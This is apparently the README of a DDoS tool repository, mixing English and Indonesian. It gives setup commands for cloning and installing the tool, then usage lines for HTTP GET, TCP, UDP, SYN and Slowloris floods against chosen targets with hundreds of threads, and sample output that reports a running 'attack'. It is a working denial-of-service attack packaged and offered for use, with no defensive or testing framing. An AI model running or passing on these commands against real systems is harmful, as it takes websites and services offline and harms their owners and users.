### HOW TO RUN THIS SCRIPT

```
pkg install git -y
pkg install python -y
git clone https://github.com/lubebansokheker/DDoS.git
cd DDoS
pip install -r requirements.txt
python stress.py
```


### OWNER https://t.me/pinguinpv


## EXAMPLE 
```
# HTTP GET flood dengan 500 thread async
python3 stress.py -t example.com -p 443 --protocol http --async --ssl -T 500 -d 120

# TCP connection flood
python3 stress.py -t 192.168.1.100 -p 80 --protocol tcp -T 300 --connections 20

# UDP flood
python3 stress.py -t target.com -p 53 --protocol udp -T 200 --rate 100

# SYN flood (perlu root)
sudo python3 stress.py -t target.com -p 443 --protocol syn -T 500

# Slowloris
python3 stress.py -t target.com -p 80 --protocol slowloris -T 200 --keep-alive
```



### SIMPLE RUN
```
python3 stress.py -t example.com -p 80 --protocol http --method GET -T 100 -d 30
```



### EXAMPLE PROCESS ATTACK
```
[*] Starting HTTP Flood on http://example.com:80/
[*] Method: GET | Threads: 100

============================================================
║ STATUS: ATTACKING
============================================================

Total Requests:      45,783
Successful:          42,156
Failed:              3,627
Success Rate:        92.08%
Requests/Second:     1526.10 RPS
Data Sent:           15.23 MB
Data Received:       89.45 MB
Elapsed Time:        30.00 seconds
============================================================
[+] Attack completed. Total requests: 45,783
```

